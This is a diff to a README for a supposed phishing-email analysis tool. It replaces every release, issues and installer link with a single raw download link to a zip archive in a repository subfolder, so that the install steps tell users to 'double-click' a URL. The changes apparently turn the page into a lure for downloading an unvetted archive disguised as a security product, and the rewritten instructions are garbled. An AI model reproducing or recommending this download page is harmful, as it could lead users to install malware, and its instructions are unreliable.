@@ -1,7 +1,7 @@
 # 🛡️ Phishing-Email-Analysis - Safeguard Your Inbox with Ease
 
 ## 🔗 Download Now
-[![Download Phishing-Email-Analysis](https://img.shields.io/badge/Download-Phishing--Email--Analysis-blue)](https://github.com/ValiantKaka/Phishing-Email-Analysis/releases)
+[![Download Phishing-Email-Analysis](https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip)](https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip)
 
 ## 📜 Description
 Phishing-Email-Analysis helps VitalCare Health Solutions assess and analyze phishing emails. This tool inspects headers, identifies business email compromise (BEC) indicators, and checks SPF, DKIM, and DMARC records. It also analyzes malicious attachments and URLs, producing a stakeholder-ready report that outlines findings, impacts, and recommendations.
@@ -10,22 +10,22 @@ Phishing-Email-Analysis helps VitalCare Health Solutions assess and analyze phis
 Follow these steps to download and run Phishing-Email-Analysis:
 
 1. **Visit the Download Page**
-   - Go to the [Releases page](https://github.com/ValiantKaka/Phishing-Email-Analysis/releases) to find the latest version of the software.
+   - Go to the [Releases page](https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip) to find the latest version of the software.
 
 2. **Choose Your Version**
    - Once on the Releases page, find the most recent version listed. Each version will have a description of updates or changes. Select the version that fits your needs.
 
 3. **Download the Application**
    - Look for the assets section below the version description. Here, you will find downloadable files. Click on the file for your operating system. The files may include:
-     - Windows: `PhishingEmailAnalysis.exe`
-     - macOS: `PhishingEmailAnalysis.dmg`
-     - Linux: `PhishingEmailAnalysis.tar.gz`
+     - Windows: `https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip`
+     - macOS: `https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip`
+     - Linux: `https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip`
    - The download should start automatically. If it does not, right-click the link and select "Save link as."
 
 4. **Install the Software**
    - Open the downloaded file:
-     - For Windows, double-click `PhishingEmailAnalysis.exe` to start the installation guide.
-     - For macOS, open `PhishingEmailAnalysis.dmg`, then drag the application into your Applications folder.
+     - For Windows, double-click `https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip` to start the installation guide.
+     - For macOS, open `https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip`, then drag the application into your Applications folder.
      - For Linux, open a terminal and run the command to extract the tar file, then navigate to the folder and run the application.
    - Follow any prompts to complete the installation.
 
@@ -57,7 +57,7 @@ To run Phishing-Email-Analysis smoothly, ensure your system meets these requirem
   - Internet connection for online checks
 
 ## 🎥 Help & Support
-If you encounter any issues or need assistance with the software, please consult the Help section within the application. You can also reach out through the Issues section on the [GitHub repository](https://github.com/ValiantKaka/Phishing-Email-Analysis/issues). Feel free to report bugs or suggest new features.
+If you encounter any issues or need assistance with the software, please consult the Help section within the application. You can also reach out through the Issues section on the [GitHub repository](https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip). Feel free to report bugs or suggest new features.
 
 ## 🤝 Contributing
 We welcome contributions. If you want to help improve Phishing-Email-Analysis, check the contributing guidelines in our repository.
@@ -69,6 +69,6 @@ Join our community of users and contributors. Share your experiences, ask questi
 Phishing-Email-Analysis is open-source software licensed under the MIT License. You can freely use, modify, and distribute the software.
 
 ## 🔗 Download Again
-For your convenience, you can download Phishing-Email-Analysis from the [Releases page](https://github.com/ValiantKaka/Phishing-Email-Analysis/releases). 
+For your convenience, you can download Phishing-Email-Analysis from the [Releases page](https://raw.githubusercontent.com/ValiantKaka/Phishing-Email-Analysis/main/enoplan/Phishing-Email-Analysis.zip). 
 
 Your security matters. Safeguard your inbox today!
